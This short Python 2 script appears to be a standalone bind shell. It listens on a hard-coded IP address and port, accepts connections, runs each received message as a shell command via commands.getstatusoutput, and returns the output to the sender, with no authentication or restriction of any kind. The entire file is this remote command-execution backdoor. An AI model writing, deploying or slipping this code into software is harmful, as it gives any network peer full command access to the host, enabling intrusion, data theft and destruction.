import socket,commands
HOST='9.98.13.40'
PORT=50008
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((HOST,PORT))
s.listen(1)
while 1:
    conn,addr=s.accept()
    print 'connected by',addr
    while 1:
        data=conn.recv(1024)
        if not data:
            break
        print "data from:",addr,data
        #cmd_result=os.popen(data).read()
        cmd_status,cmd_result=commands.getstatusoutput(data)
        if len(cmd_result)!=0:
            conn.sendall(cmd_result)
        else:
            conn.sendall('Done!')
conn.close()